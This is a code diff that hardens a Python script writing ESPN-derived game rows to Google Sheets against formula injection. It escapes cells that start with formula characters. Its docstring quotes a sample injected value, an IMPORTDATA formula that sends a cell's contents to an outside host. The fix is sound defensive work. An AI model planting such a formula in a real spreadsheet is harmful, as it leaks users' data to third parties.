@@ -91,6 +91,10 @@ WRITE_SCOPES = ["https://www.googleapis.com/auth/spreadsheets", "https://www.goo
 READ_ONLY_SCOPES = ["https://www.googleapis.com/auth/spreadsheets.readonly",
                     "https://www.googleapis.com/auth/drive.readonly"]
 
+# How a typed cell has to start for Sheets to run it as a formula. See
+# typed_as_text().
+FORMULA_STARTS = ("=", "+", "-", "@")
+
 DRY_RUN_ENV_VAR = "FIRSTIQ_DRY_RUN"
 _DRY_RUN_OFF = {"", "0", "false", "no", "off"}
 
@@ -454,6 +458,25 @@ def get_or_create_tab(spreadsheet, sheet_name, header, dry_run=False):
         return ws
 
 
+def typed_as_text(rows):
+    """Rows for a USER_ENTERED append, with nothing in them Sheets can run.
+
+    USER_ENTERED makes Sheets read each value as if it were typed into the
+    cell, so a string that starts with = + - or @ becomes a formula. The
+    names, IDs, shot method and clock in these rows come from ESPN's API:
+    an athlete named =IMPORTDATA("https://example.com/?"&A1) would have
+    run in the production sheet.
+
+    An apostrophe in front tells Sheets "this is text". Sheets does not
+    show it, so every reader still gets the value ESPN sent. Leading
+    whitespace is skipped before the check, to be safe. Every other value
+    passes through, which is why this is not a switch to RAW: RAW would
+    store today's dates, numbers and clocks as text and could change what
+    the app and the grader read."""
+    return [["'" + cell if isinstance(cell, str) and cell.lstrip().startswith(FORMULA_STARTS) else cell
+             for cell in row] for row in rows]
+
+
 def data_rows(ws):
     """Every row under the header. An empty tab, or one a dry run did not
     create, has none."""
@@ -585,7 +608,7 @@ def main():
                 # Log immediately, before doing anything else that could fail --
                 # otherwise a later exception this run leaves the dispatch fired
                 # but unrecorded, and the next run fires it again.
-                dispatch_ws.append_rows(post_tip_rows, value_input_option="USER_ENTERED")
+                dispatch_ws.append_rows(typed_as_text(post_tip_rows), value_input_option="USER_ENTERED")
                 dispatched_event_ids.update(event_id for event_id, _ in post_tip)
                 print("    Triggered and logged.")
             else:
@@ -643,7 +666,7 @@ def main():
             print(f"    {row}")
     elif fb_new_rows:
         print(f"Writing Live First Basket: {len(fb_new_rows)} new game(s).")
-        fb_ws.append_rows(fb_new_rows, value_input_option="USER_ENTERED")
+        fb_ws.append_rows(typed_as_text(fb_new_rows), value_input_option="USER_ENTERED")
 
     if updates:
         # RE-READ before writing back, and rebuild from the fresh copy.
@@ -755,7 +778,7 @@ def main():
         else:
             print(f"Opening decided for {names} -- triggering live grading...")
             if trigger_main_pipeline_workflow(dispatch_token, MAIN_PIPELINE_GRADING_WORKFLOW):
-                grading_dispatch_ws.append_rows(grading_rows, value_input_option="USER_ENTERED")
+                grading_dispatch_ws.append_rows(typed_as_text(grading_rows), value_input_option="USER_ENTERED")
                 print("    Triggered and logged.")
             else:
                 print("    Grading dispatch failed -- will retry next run "
